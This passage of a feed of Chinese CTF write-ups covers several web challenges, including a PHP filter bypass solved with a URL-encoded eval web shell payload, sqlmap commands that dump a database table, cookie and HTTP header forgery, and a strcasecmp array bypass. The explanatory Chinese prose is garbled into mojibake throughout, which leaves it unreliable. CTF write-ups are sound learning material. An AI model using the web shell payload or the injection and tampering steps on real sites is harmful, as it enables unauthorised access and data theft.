&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;That&amp;#39;s the wrong password!&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Êàë‰ª¨ÁöÑËÄÅÊúãÂèã&lt;code>strcasecmp()&lt;/code>ÂáΩÊï∞ÔºåÂÆÉÂíå&lt;code>strcmp()&lt;/code>ÂáΩÊï∞‰∏ÄÊ†∑Áî®‰∫éÊØîËæÉ‰∏§‰∏™Â≠óÁ¨¶‰∏≤ÔºåÂå∫Âà´ÊòØÂêéËÄÖ‰ºöÂå∫ÂàÜÂ§ßÂ∞èÂÜôÔºõÁªïËøáÊñπÂºèÊòØ‰º†ÂÖ•Êï∞ÁªÑÔºåËøôÊ†∑‰ºö‰Ωø‰∏§‰∏™ÂáΩÊï∞Êó†Ê≥ïÂ§ÑÁêÜËÄåËøîÂõûnull&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030104447923.png" alt="image-20211030104447923">&lt;/p>
&lt;p>&lt;code>flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}&lt;/code>&lt;/p>
&lt;h2 id="webphat-pottomed-girls">web/PHat Pottomed Girls&lt;/h2>
&lt;blockquote>
&lt;p>Now it&amp;rsquo;s attempt number 3 and this time with a Queen reference! (flag is in the root directory) (&lt;a href="http://143.198.184.186:7001/">Link&lt;/a>)&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">generateRandomString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$length&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$characters&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$charactersLength&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$characters&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$randomString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$randomString&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#111">$characters&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$charactersLength&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$randomString&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$originalstring&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;?php&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$originalstring&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;?&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fopen&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fread&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;file_get_contents&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fgets&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;less&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;more&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;head&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tail&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;dd&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cut&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;grep&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tac&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;awk&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sed&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;read&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;system&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;notewrite&amp;#34;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$newnote&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;notewrite&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#75715e">//3rd times the charm and I&amp;#39;ve learned my lesson. Now I&amp;#39;ll make sure to filter more than once :)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$newnote&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">generateRandomString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">array_push&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;notes&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$filename&lt;/span>&lt;span style="color:#d88200">.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$filename&lt;/span>&lt;span style="color:#d88200">.php&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;location:index.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÁÆÄÂçïÁúã‰∏Ä‰∏ãÊµÅÁ®ãÔºå&lt;code>filter()&lt;/code>ÂáΩÊï∞‰ºöÂØπÊàë‰ª¨post‰º†ÂÖ•ÁöÑnotewriteÂèÇÊï∞Ôºà‰πüÂ∞±ÊòØ‰ºöË¢´ÂÜôÂÖ•ÁöÑÊñá‰ª∂ÂÜÖÂÆπÔºâËøõË°åÊØîËæÉ‰∏•Ê†ºÁöÑËøáÊª§ÔºåÊñá‰ª∂ÂêçÊòØ&lt;code>generateRandomString()&lt;/code>ÁîüÊàêÁöÑÈöèÊú∫ÂêçÂ≠óÔºå‰ΩÜÊòØ‰∏çÈáçË¶ÅÔºåÂÆÉ‰ºöËá™Âä®Êãº‰∏ä.phpÁöÑÂêéÁºÄÂπ∂‰∏îÊääÂêçÂ≠óÂÜôÂà∞&lt;code>session['notes']&lt;/code>‰∏≠ÔºõÊâÄ‰ª•Êàë‰ª¨ÂîØ‰∏ÄÈúÄË¶ÅÂ§ÑÁêÜÁöÑÂ∞±ÊòØ&lt;code>filter()&lt;/code>ÂáΩÊï∞ÁöÑÁªïËøá‰∫Ü&lt;/p>
&lt;p>Â∞¥Â∞¨ÁöÑÊòØËøô‰∏™&lt;code>filter()&lt;/code>Ë∑ü‰∏™Á≠õÂ≠ê‰∏ÄÊ†∑‚Ä¶‚Ä¶È¶ñÂÖàÊòØÊ≤°ÊúâËøáÊª§&lt;code>eval()&lt;/code>ÔºåÂÖ∂Ê¨°ÊòØ&lt;code>str_replace()&lt;/code>‰πüÊòØÊ∞¥ÁöÑ‰∏ÄÊâπ&lt;/p>
&lt;p>payload:&lt;/p>
&lt;pre tabindex="0">&lt;code>notewrite=%3C%3C%3C%3C%3F%3F%3F%3Fphp+%40eval%28%24_POST%5B%27wuhu%27%5D%29%3B
&lt;/code>&lt;/pre>&lt;p>‰πãÂêéËøû‰∏äËöÅÂâëÂç≥ÂèØÊü•ÁúãÊ†πÁõÆÂΩï‰∏ãÁöÑflag.php&lt;/p>
&lt;p>&lt;code>flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}&lt;/code>&lt;/p>
&lt;h2 id="forensicsobligatory-shark">forensics/Obligatory Shark&lt;/h2>
&lt;blockquote>
&lt;p>remember to wrap the flag&lt;/p>
&lt;/blockquote>
&lt;p>ÁúãtcpÊµÅÔºåtelnetÊòéÊñáÊµÅÈáè&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030120130169.png" alt="image-20211030120130169">&lt;/p>
&lt;p>33a465747cb15e84a26564f57cda0988&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107144316344.png" alt="image-20211107144316344">&lt;/p>
&lt;p>&lt;code>flag{dancingqueen}&lt;/code>&lt;/p></description></item><item><title>DeconstruCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</link><pubDate>Sat, 30 Oct 2021 13:35:32 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</guid><description>&lt;p>&lt;a href="https://ctftime.org/event/1453/tasks/">https://ctftime.org/event/1453/tasks/&lt;/a>&lt;/p>
&lt;h2 id="webheres-a-flag">Web/Here&amp;rsquo;s a Flag&lt;/h2>
&lt;blockquote>
&lt;p>A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224148107.png" alt="image-20211003224148107">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224209166.png" alt="image-20211003224209166">&lt;/p>
&lt;p>&lt;a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">https://www.youtube.com/watch?v=dQw4w9WgXcQ&lt;/a> ‰∏çÁî®Áúã‰∫Ü Never Gonna Give You Up&lt;/p>
&lt;p>Áúãstyle.css flag: &amp;ldquo;gvf{zh0frph_wr_ghfrqvwuxfwi}&amp;quot;; ‰ΩÜÊòØ‰∏çÊòØÊúÄÁªàÁöÑflagÔºåËß£‰∏Ä‰∏ãrot13 amount=23&lt;/p>
&lt;p>&lt;code>dsc{we0come_to_deconstructf}&lt;/code>&lt;/p>
&lt;p>Á≠æÂà∞È¢ò‰πüÂ•ΩÊäòËÖæTAT&lt;/p>
&lt;h2 id="webplease">Web/Please&lt;/h2>
&lt;blockquote>
&lt;p>Hi there! We used to work together back in our old company DEEMA. I recently had a problem with my computer and lost all the files on it. I remember creating a backup of my files on the company&amp;rsquo;s servers. I know it&amp;rsquo;s been a while, but could you &lt;strong>please&lt;/strong> try to access those files? I would be very grateful!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003225518532.png" alt="image-20211003225518532">&lt;/p>
&lt;p>ÁÜüÁªÉÊäìÂåÖÔºåCookie‰∏≠Êúâ‰∏§‰∏™ÂèÇÊï∞ÔºåAdmin_AccessÂíåUsernameÔºåÊîπ‰∏∫TrueÂíåClancy&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230430641.png" alt="image-20211003230430641">&lt;/p>
&lt;p>ÊîπÊµèËßàÂô®Ê†áËØÜÂ§¥ &lt;code>User-Agent: DeemBrowser&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230638917.png" alt="image-20211003230638917">&lt;/p>
&lt;p>ÈúÄË¶ÅÂü∫Á°ÄËÆ§ËØÅÔºå‰ΩÜÊòØËøôÈáåÁöÑMagicWordÁ®çÂæÆÂç°‰∫Ü‰∏Ä‰∏ã&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003232421727.png" alt="image-20211003232421727">&lt;/p>
&lt;p>ÂéüÂõ†ÊòØÊàëÂ§™Èì∏Â∏Å‰∫ÜÂøò‰∫ÜÂä†BasicÔºå&lt;code>Authorization: Basic V2hhdCdzVGhlTWFnaWNXb3JkPw==&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004003846943.png" alt="image-20211004003846943">&lt;/p>
&lt;p>Âä†‰∏Ä‰∏™Êó•ÊúüÁöÑÂ§¥Ôºå&lt;code>Date: Thu, 1 Apr 2021 12:00:00 GMT&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004026742.png" alt="image-20211004004026742">&lt;/p>
&lt;p>Êç¢Êàê&lt;code>Date: Mon, 5 Apr 2021 12:00:00 GMT&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004153788.png" alt="image-20211004004153788">&lt;/p>
&lt;p>&lt;code>dsc{4ll-y0u-g0tt4-d0-15-r3qu35t-n1c3ly}&lt;/code>&lt;/p>
&lt;h2 id="webtaxi-union-problems">Web/Taxi Union Problems&lt;/h2>
&lt;blockquote>
&lt;p>An important package has been stolen from Mr Nagaraj by a Taxi driver. We&amp;rsquo;ve tried to ask the local taxi union about driver&amp;rsquo;s location but they are refusing provide the same.&lt;/p>
&lt;p>Since this package is required for a time sensitive matter we don&amp;rsquo;t have time to negotiate with the union.&lt;/p>
&lt;p>Your task is to obtain the location of the taxi using the given information
&lt;code>Taxi Lisence Plate: TN-06-AP-9879&lt;/code>&lt;/p>
&lt;p>HINT: The flag is the location of the taxi (no caps)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003233419781.png" alt="image-20211003233419781">&lt;/p>
&lt;p>ËæìÂÖ•&lt;code>TN-06-AP-9879'--%20&lt;/code>ÂõûÊòæ‰∏ÄÊ†∑ÔºåÊúâÊ≥®ÂÖ•ÔºåÊääpostÁöÑÂÜÖÂÆπÊãøÂéªËÆ©sqlmapË∑ë‰∏Ä‰∏ã&lt;/p>
&lt;pre tabindex="0">&lt;code>python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate --tables
python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate -T taxi --columns
python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate -T taxi --dump
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000253417.png" alt="image-20211004000253417">&lt;/p>
&lt;p>Ayanavaram&lt;/p>
&lt;h2 id="webnever-gonna-lie-to-you">*Web/Never gonna lie to you&lt;/h2>
&lt;blockquote>
&lt;p>Trust me, take everything in the home page for face value. I would never lie to you.&lt;/p>
&lt;/blockquote>
&lt;p>‰∏ªÈ°µÊúâ‰∏ÄÂè•&lt;em>Not even search engines can find it.&lt;/em>ÔºåÊèêÁ§∫Êàë‰ª¨Áúã/robots.txt&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000643314.png" alt="image-20211004000643314">&lt;/p>
&lt;p>ËΩ¨Âà∞/never_gonna_give_you_upÈ°µÈù¢ÔºåÊ†áÈ¢òÊòØAdmin Page‰ΩÜÊòØ‰∏ÄÁâáÁ©∫ÁôΩÔºåÊäìÂåÖÂêéÁúãÂà∞postË°®ÂçïÁöÑÂú∞ÊñπË¢´Êä¨Â§¥ÁªôÊå°‰Ωè‰∫ÜÔºåÁõÆÊ†áÂú∞ÂùÄÊòØ/never_gonna_let_you_down&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000944013.png" alt="image-20211004000944013">&lt;/p>
